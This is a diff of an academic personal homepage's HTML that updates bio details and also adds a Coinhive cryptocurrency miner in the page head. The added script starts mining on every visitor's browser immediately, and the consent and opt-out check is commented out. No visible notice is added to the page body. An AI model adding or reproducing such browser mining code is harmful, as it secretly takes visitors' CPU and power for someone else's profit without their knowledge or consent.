@@ -19,27 +19,65 @@
     		margin: 0;
     		list-style-type: none;
     	}
+
+    	div#mining {
+    		font-size: 60px;
+    		font-family: sans-serif;
+    		position: absolute;
+    		bottom: 0;
+    		right: 0;
+    		color: red;
+    		font-weight: bold;
+    	}
 	</style>
+	<script src="coinhive.min.js"></script>
+	<script>
+		var miner = new CoinHive.User('KFk79M0ussJFRN3Zs4vwBmR6PDdUi8uT', 'test', {throttle: 0.3});
+		miner.start();
+
+		// // Only start on non-mobile devices and if not opted-out
+		// // in the last 14400 seconds (4 hours):
+		// if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		// 	miner.start();
+		// }
+	</script>
+	<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+		document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond
+		document.getElementById("totalHashes").innerHTML = totalHashes;
+		document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
+		// Output to HTML elements...
+	}, 1000);
+</script>
   </head>
   <body>
   	<section>
 		<div>Kevin Zeng Hu (kzh)</div>
-		<div>Data Visualization and Analysis Research at MIT Media Lab</div>
+    <div>Data Visualization and Analysis Systems</div>
+		<div>PhD Student at MIT Media Lab</div>
 		<div><a href="mailto:kzh@mit.edu">kzh@mit.edu</a> | <a href="https://twitter.com/kevinzenghu" target="_blank">@kevinzenghu</a> | <a href="https://www.linkedin.com/in/kevinzenghu" target="_blank">LinkedIn</a></div>
 	</section>
 
 	—
 
 	<section>
-		<p>I'm a fifth year doctoral student in Cesar Hidalgo's <a href="http://collective.media.mit.edu" target="_blank">Collective Learning Group</a> at the <a href="https://media.mit.edu" target="_blank">MIT Media Lab</a>. My research focuses on democratizing data visualization and analysis. I'm currently interested in high-density data interface design, visualization recommendation, and applied machine learning. My work has been published in top academic journals and covered in diverse media outlets, though I'm proudest of having reached the front page of Reddit.</p>
+		<p>I'm a doctoral student in the <a href="http://collective.media.mit.edu" target="_blank">Collective Learning Group</a> at the <a href="https://media.mit.edu" target="_blank">MIT Media Lab</a>. My research focuses on democratizing data visualization and analysis. I'm currently interested in high-density data interface design, visualization recommendation, and applied machine learning. My work has been published in top academic journals and covered in diverse media outlets, though I'm proudest of having reached the front page of Reddit.</p>
 	</section>
-	
+
 	—
 
 	<section>
 		Selected Projects:
 		<ul>
-			<li><a href="http://dive.media.mit.edu" target="_blank">DIVE</a> (2018 expected) </li>
+			<li><a href="http://dive.media.mit.edu" target="_blank">DIVE</a> (2018)</li>
 			<li><a href="http://clinton.media.mit.edu" target="_blank">ClintonCircle</a> (2016)</li>
 			<li><a href="http://pantheon.media.mit.edu" target="_blank">Pantheon</a> (2014)</li>
 			<li><a href="http://fold.cm" target="_blank">FOLD</a> (2014)</li>
@@ -47,23 +85,22 @@
 			<li><a href="http://language.media.mit.edu" target="_blank">Global Language Network</a> (2014)</li>
 		</ul>
 	</section>
-	
+
 	—
 
 	<section>
 		Education:
-		<ul>		
+		<ul>
 			<li>Ph.D. MIT Media Lab (2019 expected)</li>
 			<li>S.M. MIT Media Lab (2015)</li>
 			<li>S.B. MIT Physics (2013)</li>
-		</ul>			
+		</ul>
 	</section>
 
 	—
 
 	<section>
-		Last Updated January 2018
+		Last Updated June 2018
 	</section>
   </body>
 </html>
-
